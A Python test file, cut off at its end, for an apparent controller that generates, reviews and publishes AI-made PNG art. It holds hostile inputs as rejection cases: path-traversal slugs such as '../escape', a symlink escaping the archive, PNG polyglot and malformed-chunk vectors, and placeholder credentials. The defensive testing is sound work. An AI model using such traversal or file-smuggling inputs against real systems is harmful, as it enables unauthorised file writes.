        bad_crc[PNG.index(b"IDAT") + 4] ^= 0x01
        oversized = (
            EW.azure_art.PNG_SIGNATURE
            + struct.pack(">I", EW.PNG_MAX_CHUNK_BYTES + 1) + b"IHDR")
        for candidate in (bytes(bad_crc), PNG[:-3], oversized):
            with self.subTest(size=len(candidate)), \
                 self.assertRaises(EW.GateError):
                EW._check_png(candidate)

    def test_bad_zlib_wrong_scanline_size_and_trailing_bytes_are_rejected(self):
        pixel = b"\x35\x78\xa0\xff"
        one_row = zlib.compress(b"\x00" + pixel * 512)
        for candidate in (
                real_png(compressed=b"not-zlib"),
                real_png(compressed=one_row),
                PNG + b"polyglot"):
            with self.subTest(size=len(candidate)), \
                 self.assertRaises(EW.GateError):
                EW._check_png(candidate)

    def test_invalid_ihdr_format_dimensions_and_iend_are_rejected(self):
        zero = real_png(width=0)
        interlaced_ihdr = struct.pack(
            ">IIBBBBB", 512, 512, 8, 6, 0, 0, 1)
        interlaced = (
            EW.azure_art.PNG_SIGNATURE
            + png_chunk(b"IHDR", interlaced_ihdr)
            + png_chunk(b"IDAT", zlib.compress(b""))
            + png_chunk(b"IEND", b""))
        nonempty_iend = PNG[:-12] + png_chunk(b"IEND", b"x")
        for candidate in (zero, interlaced, nonempty_iend):
            with self.subTest(size=len(candidate)), \
                 self.assertRaises(EW.GateError):
                EW._check_png(candidate)

    def test_collective_malformed_vectors_are_rejected_identically(self):
        too_many_pixels_ihdr = struct.pack(
            ">IIBBBBB", 4096, 4096, 8, 6, 0, 0, 0)
        too_many_pixels = (
            EW.azure_art.PNG_SIGNATURE
            + png_chunk(b"IHDR", too_many_pixels_ihdr)
            + png_chunk(b"IDAT", zlib.compress(b""))
            + png_chunk(b"IEND", b""))
        ihdr_frame_end = len(EW.azure_art.PNG_SIGNATURE) + 25
        duplicate_plte = (
            PNG[:ihdr_frame_end]
            + png_chunk(b"PLTE", b"\x00\x00\x00")
            + png_chunk(b"PLTE", b"\xff\xff\xff")
            + PNG[ihdr_frame_end:])
        vectors = {
            "pixel-count-over-16000000": (
                 too_many_pixels, "pixel cap"),
            "duplicate-PLTE": (
                 duplicate_plte, "PLTE"),
        }
        for label, (candidate, expected) in vectors.items():
            with self.subTest(vector=label), self.assertRaises(
                     EW.GateError) as raised:
                 EW._check_png(candidate)
            self.assertIn(expected, str(raised.exception))


class ReviewedPngProfileTests(ScratchCase):
    def setUp(self):
        super().setUp()
        self.wcfg = reviewed_png_wcfg(self.home)

    def test_explicit_and_legacy_activation_produce_the_same_snapshot(self):
        explicit = EW.publication_profile_snapshot(self.wcfg)
        legacy = EW.publication_profile_snapshot(
            reviewed_png_wcfg(self.home, explicit=False))
        self.assertEqual(explicit, legacy)
        self.assertEqual(EW.AZURE_REVIEWED_PNG_PROFILE, explicit["profile"])
        self.assertEqual(["png"], explicit["allowed_kinds"])
        self.assertEqual(8, explicit["minimum_review_score"])

    def test_checked_in_collective_controller_contract_matches_source(self):
        contract = collective_controller_contract()
        self.assertEqual(
            {
                "profile": EW.AZURE_REVIEWED_PNG_PROFILE,
                "branch_prefix": EW.REVIEWED_PNG_BRANCH_PREFIX,
                "commit_name": EW.REVIEWED_PNG_COMMIT_NAME,
                "commit_email": EW.REVIEWED_PNG_COMMIT_EMAIL,
                "contributor": EW.REVIEWED_PNG_CONTRIBUTOR,
                "title_max_chars": EW.REVIEWED_PNG_TITLE_MAX_CHARS,
                "commit_body_template": EW.REVIEWED_PNG_COMMIT_BODY_TEMPLATE,
                "workflow": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "job": EW.COLLECTIVE_PROVENANCE_CHECK,
                "rollup_json_fields": EW.PROVENANCE_ROLLUP_JSON_FIELDS,
            },
            {
                key: contract[key] for key in (
                    "profile", "branch_prefix", "commit_name", "commit_email",
                    "contributor", "title_max_chars", "commit_body_template",
                    "workflow", "job", "rollup_json_fields",
                )
            })

    def test_title_error_matches_checked_in_collective_contract_fixture(self):
        contract = collective_controller_contract()
        label = "visual-piece: title"
        expected = contract["title_error_template"].format(
            label=label, max_chars=contract["title_max_chars"])
        with self.assertRaises(EW.GateError) as raised:
            EW.validate_reviewed_submission_contract(
                meta_for("visual-piece", kind="png", title=" padded"))
        self.assertEqual(expected, str(raised.exception))

    def test_title_error_matches_current_collective_verifier_contract(self):
        contract = collective_controller_contract()
        label = "visual-piece: title"
        expected = contract["title_error_template"].format(
            label=label, max_chars=contract["title_max_chars"])
        verifier = require_collective_verifier(
            self, "title-verifier cross-check")
        script = (
            "import sys\n"
            f"sys.path.insert(0, {str(verifier.parent)!r})\n"
            "import verify_png_attestation as verifier\n"
            "try:\n"
            f"    verifier._text(' padded', {label!r}, "
            f"{contract['title_max_chars']})\n"
            "except verifier.AttestationError as exc:\n"
            "    print(str(exc))\n"
            "    raise SystemExit(7)\n"
        )
        result = subprocess.run(
            [sys.executable, "-c", script],
            cwd=str(verifier.parents[1]),
            env={**EW._minimal_env(), "PYTHONDONTWRITEBYTECODE": "1"},
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(7, result.returncode, result.stderr)
        self.assertEqual(expected, result.stdout.strip())

    def test_title_verifier_cross_check_skips_without_collective_verifier(self):
        with mock.patch.object(
                sys.modules[__name__], "collective_verifier_path",
                return_value=None):
            with self.assertRaises(unittest.SkipTest) as raised:
                self.test_title_error_matches_current_collective_verifier_contract()
        self.assertEqual(
            "real sibling Collective verify_png_attestation.py is "
            "unavailable for title-verifier cross-check",
            str(raised.exception),
        )

    def test_omitted_reviewed_identity_is_derived_but_conflicts_fail(self):
        raw = {
            key: value for key, value in reviewed_png_wcfg(self.home).items()
            if key not in ("branch_prefix", "git_author_name",
                           "git_author_email")
        }
        wcfg = EW.worker_config({"evolve_worker": raw})
        snapshot = EW.publication_profile_snapshot(wcfg)
        contract = EW.enforce_reviewed_controller_contract(
            wcfg, snapshot, raw)
        self.assertEqual(EW.REVIEWED_PNG_BRANCH_PREFIX,
                         contract["branch_prefix"])
        self.assertEqual(EW.REVIEWED_PNG_COMMIT_NAME,
                         contract["git_author_name"])
        self.assertEqual(EW.REVIEWED_PNG_COMMIT_EMAIL,
                         contract["git_author_email"])

        for field, value in (
                ("branch_prefix", "art"),
                ("git_author_name", "Mutable Child"),
                ("git_author_email", "mutable@example.com")):
            configured = dict(raw, **{field: value})
            candidate = EW.worker_config({"evolve_worker": configured})
            with self.subTest(field=field), self.assertRaises(EW.GateError):
                EW.enforce_reviewed_controller_contract(
                    candidate,
                    EW.publication_profile_snapshot(candidate),
                    configured)

    def test_every_conflicting_profile_setting_fails(self):
        mutations = {
            "allowed kinds": lambda cfg: cfg.update(allowed_kinds=["png", "svg"]),
            "Azure disabled": lambda cfg: cfg["azure_image"].update(enabled=False),
            "review below eight": lambda cfg: cfg["azure_image"].update(
                minimum_review_score=7),
            "Vision disabled": lambda cfg: cfg["rapp_vision"].update(enabled=False),
            "piece cap too small": lambda cfg: cfg.update(
                max_piece_bytes=EW.PROFILE_MIN_PIECE_BYTES - 1),
            "piece cap unbounded": lambda cfg: cfg.update(
                max_piece_bytes=EW.PROFILE_MAX_PIECE_BYTES + 1),
        }
        for label, mutate in mutations.items():
            cfg = reviewed_png_wcfg(self.home)
            mutate(cfg)
            with self.subTest(label=label), self.assertRaises(EW.GateError):
                EW.publication_profile_snapshot(cfg)

    def test_deployment_and_review_model_must_be_bounded_identifiers(self):
        cases = {
            "deployment with spaces": ("deployment", "gpt image 2"),
            "review model with spaces": ("review_model", "gpt 5.4"),
        }
        for label, (field, value) in cases.items():
            cfg = reviewed_png_wcfg(self.home)
            cfg["azure_image"][field] = value
            with self.subTest(case=label), self.assertRaises(
                    EW.GateError) as raised:
                EW.publication_profile_snapshot(cfg)
            self.assertIn("bounded identifier", str(raised.exception))

    def test_unknown_profile_is_rejected(self):
        bad = dict(self.wcfg, publication_profile="looks-visual-enough")
        with self.assertRaises(EW.GateError):
            EW.publication_profile_snapshot(bad)

    def test_png_is_never_available_outside_the_reviewed_profile(self):
        self.assertEqual(
            ("svg", "md", "txt", "json"),
            EW.allowed_kinds(EW.worker_config({})))
        for kinds in (["png"], ["svg", "png"], ["png", "json"]):
            wcfg = EW.worker_config({
                "evolve_worker": {
                    "allowed_kinds": kinds,
                    "azure_image": {"enabled": False},
                },
            })
            with self.subTest(kinds=kinds), self.assertRaises(EW.GateError):
                EW.publication_profile_snapshot(wcfg)

    def test_unprofiled_png_is_rejected_by_the_gate_itself(self):
        staging = self.home / "legacy-png"
        out = EW.prepare_staging(staging)
        out.joinpath("meta.json").write_text(
            json.dumps(meta_for("legacy-png", kind="png")),
            encoding="utf-8")
        out.joinpath("piece.png").write_bytes(PNG)
        wcfg = EW.worker_config({
            "evolve_worker": {"allowed_kinds": ["png"]}})
        with self.assertRaises(EW.GateError) as raised:
            EW.gate_directory(
                staging / "out", wcfg, 1, None, known_slugs=set())
        self.assertIn("PNG requires", str(raised.exception))

    def test_reviewed_vision_relationships_fail_in_profile_preflight(self):
        mutations = {
            "thumb escapes channel": {
                "media_dir": "other/media",
            },
            "registry collides with channel": {
                "registry_path": "dada/channel.json",
            },
            "registry is missing": {
                "registry_path": "",
            },
            "channel is inside media": {
                "channel_path": "dada/media/channel.json",
            },
            "registry is inside media": {
                "registry_path": "dada/media/channels.json",
            },
            "app base already has a fragment": {
                "collective_viewer_url": (
                    "https://example.test/view.html#/already"),
            },
        }
        for label, changes in mutations.items():
            wcfg = reviewed_png_wcfg(self.home)
            wcfg["rapp_vision"] = {
                **wcfg["rapp_vision"],
                **changes,
            }
            with self.subTest(case=label), self.assertRaises(EW.GateError):
                EW.publication_profile_snapshot(wcfg)

    def test_maker_and_child_prompts_are_visual_only(self):
        self.wcfg["fanout"] = {"enabled": True, "children": 3}
        role = next(iter(EW.NB.NEIGHBORS))
        identities = {name: f"rappid:test:{name}" for name in EW.NB.NEIGHBORS}
        roll = {name: {"alive": True} for name in EW.NB.NEIGHBORS}
        with mock.patch.object(EW.NB, "identities", return_value=identities), \
             mock.patch.object(EW.NB, "roll_call", return_value=roll), \
             mock.patch.object(
                 EW.NB, "chain_path", return_value=self.home / "chain.jsonl"):
            prompt = EW.build_prompt(
                {"instance_name": "Dada"}, self.wcfg, role,
                self.home / "staging", 1, None, [])
        self.assertIn("Every candidate, critique, round winner", prompt)
        self.assertIn("NEVER write piece.png yourself", prompt)
        self.assertIn("Write meta.json, piece.prompt, and state-out.json only",
                      prompt)
        self.assertNotIn("piece.<ext>", prompt)

        fcfg = EW.profiled_fanout_config(
            self.wcfg, EW.publication_profile_snapshot(self.wcfg))
        specs, _ = EW.SS.plan_children(fcfg, [], 0, now=NOW)
        self.assertNotIn("execution-designer", [item["name"] for item in specs])
        situation = EW.fanout_situation(
            {"instance_name": "Dada"}, self.wcfg, role, 1, None)
        child = EW.SS.child_prompt(
            specs[0], fcfg, 1, "Dada", role, situation, [], [])
        self.assertIn("visual-only", child)
        self.assertIn("Never propose SVG, markdown, text, JSON", child)
        self.assertNotIn("self-contained SVG, markdown, text or json", child)
        repair = EW.SS.repair_prompt(
            specs[0], fcfg, 1, "bad JSON", "{}")
        self.assertIn("visual-only", repair)

    def test_legacy_profiles_keep_the_execution_designer(self):
        legacy = EW.worker_config({
            "evolve_worker": {"fanout": {"enabled": True, "children": 3}}})
        fcfg = EW.profiled_fanout_config(legacy)
        specs, _ = EW.SS.plan_children(fcfg, [], 0, now=NOW)
        self.assertIn("execution-designer", [item["name"] for item in specs])

    def test_vision_refuses_unreceipted_png_before_any_repository_work(self):
        submission = {
            "slug": "visual-piece",
            "title": "Visual Piece",
            "kind": "png",
            "meta": meta_for("visual-piece", kind="png"),
            "piece_path": "submissions/visual-piece/piece.png",
            "piece_sha256": hashlib.sha256(PNG).hexdigest(),
        }
        with mock.patch.object(EW, "_clone_repo") as clone, \
             self.assertRaises(EW.GateError):
            EW.publish_rapp_vision(
                self.home / "workspace", submission, PNG, self.wcfg,
                lambda phase: healthy(),
                profile_snapshot=EW.publication_profile_snapshot(self.wcfg))
        clone.assert_not_called()


class AzureImagePipelineTests(ScratchCase):
    def setUp(self):
        super().setUp()
        self.staging = self.home / "staging"
        self.out = EW.prepare_staging(self.staging)
        self.baseline = EW.staging_manifest(self.staging)
        self.wcfg = EW.worker_config({"evolve_worker": {
            "publication_profile": EW.AZURE_REVIEWED_PNG_PROFILE,
            "allowed_kinds": ["png"],
            "max_piece_bytes": 10 * 1024 * 1024,
            "rapp_vision": {
                "enabled": True,
                "repo": str(self.home / "vision"),
            },
            "azure_image": {
                "enabled": True,
                "endpoint": "https://dada.example.openai.azure.com",
                "deployment": "gpt-image-2",
                "fallback_deployment": "gpt-image-2",
                "max_attempts": 2,
                "minimum_review_score": 8,
            },
        }})
        self.prompt = (
            "A museum-grade surreal landscape with a single impossible "
            "architectural focal point, dramatic light, no labels.")
        meta = meta_for("visual-piece", cycle=2, previous="already-here",
                        kind="png", _image_prompt=self.prompt)
        (self.out / "meta.json").write_text(
            json.dumps(meta), encoding="utf-8")
        (self.out / "piece.prompt").write_text(
            self.prompt, encoding="utf-8")
        (self.staging / "state-out.json").write_text(
            '{"cycle":2,"last_slug":"visual-piece"}', encoding="utf-8")

    @staticmethod
    def good_review(*_):
        return {
            "schema": "rapp-image-review/1.0",
            "score": 9,
            "publish": True,
            "failures": [],
            "strengths": ["clear focal hierarchy", "finished composition"],
        }

    def test_controller_generates_reviews_archives_and_gates_png(self):
        EW.verify_staging_tree(self.staging, self.baseline, self.wcfg)
        receipt = EW.materialize_azure_image(
            self.staging, self.wcfg,
            generator=lambda prompt, cfg: (PNG, "gpt-image-2"),
            reviewer=self.good_review)
        self.assertEqual(9, receipt["score"])
        self.assertFalse((self.out / "piece.prompt").exists())
        self.assertEqual(PNG, (self.out / "piece.png").read_bytes())
        self.assertEqual(PNG, (EW.ART_ARCHIVE / "visual-piece.png").read_bytes())
        meta = json.loads((self.out / "meta.json").read_text())
        generation = meta["_image_generation"]
        self.assertEqual(EW.IMAGE_GENERATION_SCHEMA, generation["schema"])
        self.assertEqual(EW.AZURE_REVIEWED_PNG_PROFILE, generation["profile"])
        self.assertEqual(
            hashlib.sha256(PNG).hexdigest(), generation["image_sha256"])
        self.assertEqual(
            {"width": 512, "height": 512}, generation["image"])
        self.assertEqual(EW.IMAGE_REVIEW_SCHEMA,
                         generation["review"]["schema"])
        self.assertTrue(generation["review"]["publish"])
        self.assertEqual(9, generation["review"]["score"])
        self.assertEqual(8, generation["review"]["minimum_score"])
        self.assertEqual([], generation["review"]["failures"])
        submission = EW.gate_directory(
            self.staging / "out", self.wcfg, 2, "already-here", None,
            {"already-here"})
        self.assertEqual("png", submission["kind"])
        self.assertEqual({"width": 512, "height": 512}, submission["image"])

    def test_reviewed_title_and_contributor_fail_before_remote_effects(self):
        original = json.loads(self.out.joinpath("meta.json").read_text())
        cases = {
            "leading whitespace": {"title": " Visual Piece"},
            "trailing whitespace": {"title": "Visual Piece "},
            "201 characters": {"title": "x" * 201},
            "tab": {"title": "Visual\tPiece"},
            "newline": {"title": "Visual\nPiece"},
            "control": {"title": "Visual\x1fPiece"},
            "wrong contributor": {"contributor": "someone-else"},
        }
        for label, changes in cases.items():
            meta = json.loads(json.dumps(original))
            meta.update(changes)
            self.out.joinpath("meta.json").write_text(
                json.dumps(meta), encoding="utf-8")
            archive = self.home / f"archive-{label.replace(' ', '-')}"
            generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
            reviewer = mock.Mock(return_value=self.good_review())
            with self.subTest(case=label), \
                    mock.patch.object(EW, "ART_ARCHIVE", archive), \
                    self.assertRaises(EW.GateError):
                EW.materialize_azure_image(
                    self.staging, self.wcfg, generator, reviewer)
            generator.assert_not_called()
            reviewer.assert_not_called()
            self.assertFalse(archive.exists())
            self.assertFalse(self.out.joinpath("piece.png").exists())

    def test_reviewed_title_boundary_lengths_materialize(self):
        for length in (1, EW.REVIEWED_PNG_TITLE_MAX_CHARS):
            staging = self.home / f"title-boundary-{length}" / "staging"
            out = EW.prepare_staging(staging)
            prompt = self.prompt
            out.joinpath("meta.json").write_text(
                json.dumps(meta_for(
                    f"title-boundary-{length}",
                    kind="png",
                    title="x" * length,
                    _image_prompt=prompt,
                )),
                encoding="utf-8",
            )
            out.joinpath("piece.prompt").write_text(
                prompt, encoding="utf-8")
            archive = self.home / f"title-boundary-{length}" / "archive"
            with self.subTest(length=length), \
                    mock.patch.object(EW, "ART_ARCHIVE", archive):
                result = EW.materialize_azure_image(
                    staging,
                    self.wcfg,
                    generator=lambda *_: (PNG, "gpt-image-2"),
                    reviewer=self.good_review,
                )
            self.assertEqual(9, result["score"])
            self.assertEqual(
                PNG,
                archive.joinpath(f"title-boundary-{length}.png").read_bytes(),
            )

    def test_invalid_slug_is_rejected_before_any_filesystem_or_azure_write(self):
        cases = {
            "traversal": "../escape",
            "nested traversal": "valid/../../escape",
            "absolute": str(self.home / "absolute-escape"),
            "forward separator": "visual/piece",
            "back separator": r"visual\piece",
            "unicode confusable": "visual\u2010piece",
            "overlength": "a" * (EW.SLUG_MAX + 1),
        }
        original = json.loads(self.out.joinpath("meta.json").read_text())
        for label, slug in cases.items():
            meta = json.loads(json.dumps(original))
            meta["slug"] = slug
            self.out.joinpath("meta.json").write_text(
                json.dumps(meta), encoding="utf-8")
            archive = self.home / "archive-zone" / label / "art"
            before = {
                path.relative_to(self.home)
                for path in self.home.rglob("*")
            }
            generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
            reviewer = mock.Mock(return_value=self.good_review())
            with self.subTest(case=label), \
                    mock.patch.object(EW, "ART_ARCHIVE", archive), \
                    self.assertRaises(EW.GateError):
                EW.materialize_azure_image(
                    self.staging, self.wcfg, generator, reviewer)
            after = {
                path.relative_to(self.home)
                for path in self.home.rglob("*")
            }
            self.assertEqual(before, after)
            generator.assert_not_called()
            reviewer.assert_not_called()
            self.assertFalse(archive.exists())
            self.assertFalse(any(
                path.is_file() and path.read_bytes() == PNG
                for path in self.home.rglob("*")
            ))

    def test_resolved_archive_destination_must_remain_a_direct_child(self):
        archive = self.home / "archive"
        outside = self.home / "outside"
        archive.mkdir()
        outside.mkdir()
        archive.joinpath("visual-piece.png").symlink_to(
            outside / "escaped.png")
        generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
        reviewer = mock.Mock(return_value=self.good_review())
        with mock.patch.object(EW, "ART_ARCHIVE", archive), \
                self.assertRaises(EW.GateError) as raised:
            EW.materialize_azure_image(
                self.staging, self.wcfg, generator, reviewer)
        self.assertIn("direct child", str(raised.exception))
        generator.assert_not_called()
        reviewer.assert_not_called()
        self.assertFalse(outside.joinpath("escaped.png").exists())

    def test_reviewed_contract_is_revalidated_by_gate_and_final_receipt(self):
        EW.materialize_azure_image(
            self.staging,
            self.wcfg,
            generator=lambda *_: (PNG, "gpt-image-2"),
            reviewer=self.good_review,
        )
        valid_meta = json.loads(self.out.joinpath("meta.json").read_text())
        snapshot = EW.publication_profile_snapshot(self.wcfg)
        for field, value in (
                ("title", " Visual Piece"),
                ("contributor", "not-kody-w")):
            meta = json.loads(json.dumps(valid_meta))
            meta[field] = value
            self.out.joinpath("meta.json").write_text(
                json.dumps(meta), encoding="utf-8")
            with self.subTest(boundary="gate", field=field), \
                    self.assertRaises(EW.GateError):
                EW.gate_directory(
                    self.staging / "out",
                    self.wcfg,
                    2,
                    "already-here",
                    known_slugs={"already-here"},
                    profile_snapshot=snapshot,
                )
            submission = {
                "slug": "visual-piece",
                "meta": meta,
                "meta_sha256": "a" * 64,
                "piece_sha256": "b" * 64,
            }
            with self.subTest(boundary="final receipt", field=field), \
                    self.assertRaises(EW.GateError):
                EW.durable_deployment_receipt(
                    {},
                    self.wcfg,
                    submission,
                    {"merge_commit": "collective-merge"},
                    {"merge_commit": "vision-merge"},
                    {},
                    profile_snapshot=snapshot,
                )
        self.out.joinpath("meta.json").write_text(
            json.dumps(valid_meta), encoding="utf-8")

    def test_reviewer_score_is_integral_and_serializes_as_a_json_integer(self):
        normalized = EW.normalize_visual_review({
            **self.good_review(),
            "score": 9.0,
        })
        self.assertIs(type(normalized["score"]), int)
        self.assertEqual(9, normalized["score"])
        for score in (8.5, True, False):
            with self.subTest(score=score), self.assertRaises(EW.GateError):
                EW.normalize_visual_review({
                    **self.good_review(),
                    "score": score,
                })

        meta = meta_for("visual-piece", kind="png")
        meta["_image_generation"] = json.loads(json.dumps(
            COLLECTIVE_RECEIPT_FIXTURE))
        snapshot = EW.publication_profile_snapshot(self.wcfg)
        EW.validate_image_generation_receipt(meta, PNG, snapshot)
        serialized = json.dumps(meta["_image_generation"])
        decoded = json.loads(serialized)
        self.assertIs(type(decoded["review"]["score"]), int)
        self.assertNotIn('"score": 9.0', serialized)
        self.assertEqual(
            {
                "schema", "profile", "provider", "deployment", "attempts",
                "image_sha256", "image", "review",
            },
            set(decoded))
        self.assertEqual(
            {
                "schema", "model", "publish", "score", "minimum_score",
                "failures", "strengths",
            },
            set(decoded["review"]))

    def test_collective_receipt_numeric_fields_require_exact_json_types(self):
        snapshot = EW.publication_profile_snapshot(self.wcfg)

        def receipt_with(path, value):
            receipt = json.loads(json.dumps(COLLECTIVE_RECEIPT_FIXTURE))
            target = receipt
            for part in path[:-1]:
                target = target[part]
            target[path[-1]] = value
            return {
                **meta_for("visual-piece", kind="png"),
                "_image_generation": receipt,
            }

        cases = {
            "fractional score": (("review", "score"), 8.5),
            "integral float score": (("review", "score"), 9.0),
            "boolean score": (("review", "score"), True),
            "float minimum": (("review", "minimum_score"), 8.0),
            "float width": (("image", "width"), 512.0),
            "boolean attempts": (("attempts",), True),
        }
        for label, (path, value) in cases.items():
            with self.subTest(case=label), self.assertRaises(EW.GateError):
                EW.validate_image_generation_receipt(
                    receipt_with(path, value), PNG, snapshot)

    def test_review_strengths_reject_control_and_credential_material(self):
        snapshot = EW.publication_profile_snapshot(self.wcfg)
        for strength in (
                "strong focal hierarchy\x01with hidden control",
                "password: hunter2"):
            meta = meta_for("visual-piece", kind="png")
            receipt = json.loads(json.dumps(COLLECTIVE_RECEIPT_FIXTURE))
            receipt["review"]["strengths"][0] = strength
            meta["_image_generation"] = receipt
            with self.subTest(strength=repr(strength)), self.assertRaises(
                    EW.GateError):
                EW.validate_image_generation_receipt(meta, PNG, snapshot)

    def test_maker_credential_metadata_fails_before_azure_generation(self):
        original = json.loads(self.out.joinpath("meta.json").read_text())
        cases = {
            "raw password in child premise": (
                lambda meta: meta["_dada_cycle"]["rounds"][0][
                    "candidates"][0].update(
                        premise="password: hunter2"),
                self.prompt,
                "raw credential",
            ),
            "raw api key in image prompt": (
                lambda meta: meta.update(
                    _image_prompt="api_key=ABCDEFGH12345678"),
                "api_key=ABCDEFGH12345678",
                "raw credential",
            ),
            "credential-like underscore key": (
                lambda meta: meta.update(
                    _azure_api_key="redacted-but-forbidden"),
                self.prompt,
                "credential field",
            ),
        }
        for label, (mutate, prompt, expected) in cases.items():
            meta = json.loads(json.dumps(original))
            mutate(meta)
            self.out.joinpath("meta.json").write_text(
                json.dumps(meta), encoding="utf-8")
            self.out.joinpath("piece.prompt").write_text(
                prompt, encoding="utf-8")
            generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
            reviewer = mock.Mock(return_value=self.good_review())
            with self.subTest(case=label), self.assertRaises(
                    EW.GateError) as raised:
                EW.materialize_azure_image(
                    self.staging, self.wcfg, generator, reviewer)
            self.assertIn(expected, str(raised.exception))
            generator.assert_not_called()
            reviewer.assert_not_called()

    def test_direct_png_and_forged_maker_receipt_fail_before_generation(self):
        self.out.joinpath("piece.prompt").unlink()
        self.out.joinpath("piece.png").write_bytes(PNG)
        with self.assertRaises(EW.GateError) as direct:
            EW.verify_staging_tree(self.staging, self.baseline, self.wcfg)
        self.assertIn("not part of a submission", str(direct.exception))
        with self.assertRaises(EW.GateError) as gate:
            EW.gate_directory(
                self.staging / "out", self.wcfg, 2, "already-here",
                known_slugs={"already-here"})
        self.assertIn("generation receipt", str(gate.exception))

        self.out.joinpath("piece.png").unlink()
        self.out.joinpath("piece.prompt").write_text(
            self.prompt, encoding="utf-8")
        meta = json.loads(self.out.joinpath("meta.json").read_text())
        meta["_image_generation"] = {"schema": "forged"}
        self.out.joinpath("meta.json").write_text(
            json.dumps(meta), encoding="utf-8")
        generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
        reviewer = mock.Mock(return_value=self.good_review())
        with self.assertRaises(EW.GateError) as forged:
            EW.materialize_azure_image(
                self.staging, self.wcfg, generator, reviewer)
        self.assertIn("maker may not supply", str(forged.exception))
        generator.assert_not_called()
        reviewer.assert_not_called()

    def test_missing_or_tampered_receipt_fails_closed(self):
        EW.materialize_azure_image(
            self.staging, self.wcfg,
            generator=lambda prompt, cfg: (PNG, "gpt-image-2"),
            reviewer=self.good_review)
        meta = json.loads(self.out.joinpath("meta.json").read_text())
        snapshot = EW.publication_profile_snapshot(self.wcfg)

        def changed(mutator):
            candidate = json.loads(json.dumps(meta))
            mutator(candidate)
            return candidate

        cases = {
            "missing": changed(lambda doc: doc.pop("_image_generation")),
            "digest": changed(lambda doc: doc["_image_generation"].update(
                image_sha256="0" * 64)),
            "dimensions": changed(lambda doc: doc["_image_generation"]["image"].update(
                width=513)),
            "publish": changed(lambda doc: doc["_image_generation"]["review"].update(
                publish=False)),
            "score": changed(lambda doc: doc["_image_generation"]["review"].update(
                score=7)),
            "minimum": changed(lambda doc: doc["_image_generation"]["review"].update(
                minimum_score=9)),
            "failures": changed(lambda doc: doc["_image_generation"]["review"].update(
                failures=["visible defect"])),
            "extra field": changed(lambda doc: doc["_image_generation"].update(
                maker_claim=True)),
        }
        for label, candidate in cases.items():
            with self.subTest(label=label), self.assertRaises(EW.GateError):
                EW.validate_image_generation_receipt(
                    candidate, PNG, snapshot)

    def test_malformed_generated_png_never_reaches_the_reviewer(self):
        reviewer = mock.Mock(return_value=self.good_review())
        with self.assertRaises(EW.GateError):
            EW.materialize_azure_image(
                self.staging, self.wcfg,
                generator=lambda prompt, cfg: (
                    PNG + b"trailing", "gpt-image-2"),
                reviewer=reviewer)
        reviewer.assert_not_called()
        self.assertFalse(self.out.joinpath("piece.png").exists())

    def test_a_rejected_image_is_regenerated_with_visual_feedback(self):
        prompts = []
        reviews = iter([
            {
                "schema": "rapp-image-review/1.0", "score": 4,
                "publish": False, "failures": ["muddy focal point"],
                "strengths": ["good palette"],
            },
            self.good_review(),
        ])

        def generate(prompt, cfg):
            prompts.append(prompt)
            return PNG, "gpt-image-2"

        receipt = EW.materialize_azure_image(
            self.staging, self.wcfg, generator=generate,
            reviewer=lambda *_: next(reviews))
        self.assertEqual(2, receipt["attempts"])
        self.assertIn("muddy focal point", prompts[1])

    def test_two_bad_images_fail_the_cycle_without_a_publishable_piece(self):
        bad = {
            "schema": "rapp-image-review/1.0", "score": 3,
            "publish": False, "failures": ["obvious malformed anatomy"],
            "strengths": [],
        }
        with self.assertRaises(EW.GateError) as cm:
            EW.materialize_azure_image(
                self.staging, self.wcfg,
                generator=lambda prompt, cfg: (PNG, "gpt-image-2"),
                reviewer=lambda *_: bad)
        self.assertIn("failed visual review", str(cm.exception))
        self.assertFalse((self.out / "piece.png").exists())

    def test_final_links_open_in_safari_only_when_enabled(self):
        wcfg = EW.worker_config({"evolve_worker": {
            "azure_image": {
                "enabled": True,
                "endpoint": "https://dada.example.openai.azure.com",
                "open_in_browser": True,
            },
        }})
        receipts = {
            "collective_url": "https://example.test/collective",
            "vision_url": "https://example.test/vision",
        }
        done = subprocess.CompletedProcess([], 0, "", "")
        with mock.patch.object(EW.sys, "platform", "darwin"), \
             mock.patch.object(EW.subprocess, "run",
                               return_value=done) as run:
            self.assertTrue(EW.open_final_art(wcfg, receipts))
        self.assertEqual(
            ["/usr/bin/open", "-a", "Safari",
             receipts["collective_url"], receipts["vision_url"]],
            run.call_args.args[0])


# ── end to end, against temp repos ──────────────────────────────────────────

def healthy():
    return {"status": "healthy", "failed": [], "critical": [],
            "checks": [], "summary": "all good"}


def critical(*ids):
    return {"status": "critical", "failed": list(ids), "critical": list(ids),
            "checks": [], "summary": "on fire"}


def worker_cfg(**overrides):
    cfg = {
        "level": 3,
        "instance_name": "Dada Collective",
        "copilot_model": "test-model",
        "evolve_timeout_s": 60,
        "daily_evolve_budget": 10,
        "evolve_interval_hours": 0,
        "notify": True,
        "notify_handle": "+15550000001",
        "report_number": "+15550000002",
        "commons_repo": "kody-w/public-art-collective",
        "creative_state_file": "state/evolve-creative-state.json",
        "evolve_worker": {"enabled": True, "degraded_allowlist": ["w_openrappter_spin"]},
    }
    worker_block = overrides.pop("evolve_worker", None)
    cfg.update(overrides)
    if worker_block:
        cfg["evolve_worker"] = {**cfg["evolve_worker"], **worker_block}
    return cfg


class FakeGh:
    """Just enough GitHub to prove the controller believes only evidence.

    `pr view` answers from the bare origin repo, not from what the controller
    thinks it pushed, and `pr merge` really moves origin/main — so the
    post-merge re-read in publish() is exercised for real.
    """

    def __init__(self, origin, base="main"):
        self.origin = Path(origin)
        self.base = base
        self.calls = []
        self.extra_file = None      # to fake a PR that touches more than it should
        self.merged = False
        self.closed = False
        self.raise_after_merge = None
        self.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "SUCCESS",
        }]]
        self.merge_state_status = "CLEAN"
        self.merge_state_sequence = []

    def __call__(self, *args, timeout=None, wcfg=None, ctx=None):
        self.calls.append(args)
        if args[:2] == ("pr", "view") and "--json" in args:
            fields = args[args.index("--json") + 1].split(",")
            if "merged" in fields:
                raise AssertionError("gh pr view has no `merged` JSON field")
